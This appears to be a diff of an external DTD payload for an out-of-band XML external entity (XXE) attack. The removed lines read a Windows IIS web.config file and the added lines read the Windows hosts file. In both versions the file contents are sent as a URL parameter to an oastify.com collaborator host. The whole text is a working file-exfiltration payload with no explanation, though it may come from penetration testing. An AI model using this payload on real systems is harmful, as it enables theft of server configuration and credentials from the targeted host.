@@ -1,4 +1,4 @@
-<!ENTITY % file SYSTEM "file:///C:/inetpub/wwwroot/web.config">
-<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://3y2bk6tc1744miappfuk6i4e45a0yqmf.oastify.com/?webconfig=%file;'>">
+<!ENTITY % file SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://3y2bk6tc1744miappfuk6i4e45a0yqmf.oastify.com/?hosts_windows=%file;'>">
 %eval;
 %exfil;
